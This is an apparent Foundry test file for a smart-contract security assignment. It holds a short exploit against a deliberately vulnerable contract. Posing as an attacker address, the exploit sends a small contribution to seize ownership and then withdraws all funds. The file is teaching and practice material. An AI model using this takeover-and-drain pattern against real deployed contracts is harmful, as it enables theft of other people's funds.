// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {Assignment11} from "../src/Assignment11.sol";

contract Assignment11Exploit is Test {
    Assignment11 public vulnerableContract;
    address public attacker;

    function setUp() public {
        // Deploy the vulnerable contract
        vulnerableContract = new Assignment11();
        attacker = address(0x1234567890abcdef1234567890abcdef12345678); // Attacker address
    }

    function exploit() public {
        // Step 1: The attacker contributes to the contract to take ownership
        vm.startPrank(attacker);
        payable(address(vulnerableContract)).transfer(0.001 ether); // Contribute 0.001 ether
        vm.stopPrank();

        // Step 2: The attacker now withdraws all funds as the new owner
        vm.startPrank(attacker);
        vulnerableContract.withdraw(); // Withdraw all funds from the contract
        vm.stopPrank();
    }

    receive() external payable {}
}
